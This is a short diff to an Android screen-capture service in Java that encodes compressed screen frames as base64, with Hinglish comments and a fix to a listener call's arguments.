@@ -73,7 +73,6 @@ public class ScreenCaptureService extends Service {
         DisplayMetrics metrics = new DisplayMetrics();
         wm.getDefaultDisplay().getMetrics(metrics);
         
-        // Screen resolution kam kar rahe hain taaki data fast travel kare
         int width = 540; 
         int height = 960;
         int density = metrics.densityDpi;
@@ -84,6 +83,7 @@ public class ScreenCaptureService extends Service {
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 imageReader.getSurface(), null, null);
 
+        // Yahan humne sirf 2 arguments rakhe hain (Handler null kar diya)
         imageReader.setOnImageAvailableListener(reader -> {
             Image image = null;
             try {
@@ -99,7 +99,7 @@ public class ScreenCaptureService extends Service {
                     bitmap.copyPixelsFromBuffer(buffer);
 
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 30, baos); // 30% Quality
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 30, baos);
                     byte[] byteArray = baos.toByteArray();
                     String base64Image = Base64.encodeToString(byteArray, Base64.DEFAULT);
 
@@ -119,7 +119,7 @@ public class ScreenCaptureService extends Service {
             } finally {
                 if (image != null) image.close();
             }
-        }, null, null);
+        }, null); // <--- Yahan pehle null, null tha, ab sirf null hai
     }
 
     @Override
